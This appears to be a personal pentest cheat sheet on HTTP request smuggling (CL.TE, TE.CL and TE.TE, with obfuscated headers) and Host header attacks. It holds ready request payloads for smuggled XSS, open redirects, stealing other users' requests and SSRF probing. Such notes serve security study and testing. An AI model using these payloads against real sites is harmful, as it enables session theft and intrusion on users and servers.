# HTTP

## HTTP Smuggling

A smuggling vulnerability happens beacuse there are multiple ambiguous ways to define the length of an HTTP request the `Content-Length` header and the `Transfer-Encoding` header that is used to define the total length of a message split in chunked requests. Clients and servers may parse these headers differently and allow to include unexpected code in a HTTP request

Example of a chunked request

```
POST ... HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b    #start delimiter
<body>
0    #end delimiter
```

#### CL.TE Exploit

Front end uses `Content-Length` and back end uses `Transfer-Encoding`

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

#### TE.CL Exploit

Front end uses `Transfer-Encoding` and back end uses `Content-Length`

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED 
0
[\r\n\r\n]
```

#### TE.TE Exploit

Both the client and the server use `Transfer-Encoding` but one of them can be tricked to not parse the header by obfuscating it

```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[\t]chunked
 Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

### Reflected XSS

Allows to easily target an HTTP header and body. When a user sends his request it will be appended to the malicious smuggled request and will trigger the XSS vulnerability without requiring interaction

```
POST / HTTP/1.1
Host: <target>
Content-Length: <len>
Transfer-Encoding: chunked

0

GET / HTTP/1.1
<header>: <XSS>
Foo: X
```

### Open redirect

Allows to redirect the user to an arbitrary site by overwriting the `Host` header

```
POST / HTTP/1.1
Host: <target>
Content-Length: <len>
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: <redirect to>
Foo: X
```

### Reflect a user's request as value of an argument

Allows to steal a HTTP request from a user and print it as the value of a parameter in a GET or POST request

```
GET / HTTP/1.1
Host: <target>
Transfer-Encoding: chunked
Content-Length: <len>

0

POST <req> HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: <len>
<req param>=
```

For instance if the target request is like `/save?username=usr&msg=text` it is possible to steal the next user's request with the following payload and navigating to a point in the site where the msg parameter is displayed

```
GET / HTTP/1.1
Host: <target>
Transfer-Encoding: chunked
Content-Length: <len>

0

POST <req> HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: <len>
/save?username=usr&msg=
```

## Host Header Attacks

The host header is used to inform balancers and front end server to where to redirect the user. By tampering this header it is possible to perform SSRF attacks. To find vulnerabilities in how the Host header is parsed by using the following steps

* Send an arbitrary host
* Check for host validation where only the url is validated and not the port `hostsite.com:evil`
* Try to send a request with an url as part of an accepted subdomain `evil-hostsite.com` or `evilhostsite.com`
* Duplicate the Host header
* Add indentation before or after the header such as tabs spaces and \n
* Sending the request to a full url instead of a relative one may lead the server to parse the header differently

### Header overwrite

It is possible to overwrite the value of Host by adding one on the following headers to the request

```
X-Forwarded-Host
X-Forwarded-Server
X-HTTP-Host-Override
Forwarded
```

### SSRF

Controlling the Host header allows to scout the internal network of the target machine in order to find other servers. To verifiy the vulnerability replace the Host value with the url of a server you control. If you receive a hit from the target machine or another one in the same network then the servers are vulnerable and you can use bruteforce or dictionary attacks to locate new machines. If the response is a redirect (3XX) then the machine with the given hostname or ip address exists
